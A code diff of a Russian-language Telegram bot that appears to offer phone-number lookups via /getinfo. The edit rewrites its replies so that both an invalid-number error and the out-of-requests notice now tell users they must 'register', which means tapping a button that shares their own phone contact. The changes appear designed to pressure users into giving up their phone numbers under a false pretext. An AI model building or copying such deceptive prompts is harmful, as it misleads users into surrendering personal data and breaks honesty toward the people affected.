@@ -26,7 +26,7 @@ def proc2(message):
 		num = user_input.replace('+', '')
 
 		if not num.isdigit():
-			msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
+			msg = bot.reply_to(message, 'для бесплатного использования бота нужно зарегистрироваться, повторите попытку, написав /getinfo!')#⏳
 			return
 
 		bot.send_message(m_id, f'Запрос на номер {num} отправлен!')
@@ -34,8 +34,7 @@ def proc2(message):
 		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
 		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
 		keyboard.add(button_phone)	
-		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
-			Чтобы получить дополнительные вопросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
+		bot.send_message(m_id, '''Чтобы получить дополнительные попытки необходимо зарегистрироваться!''', reply_markup=keyboard)
 # Отловка ошибок
 	except Exception as e:
 		bot.send_message(ID, e)
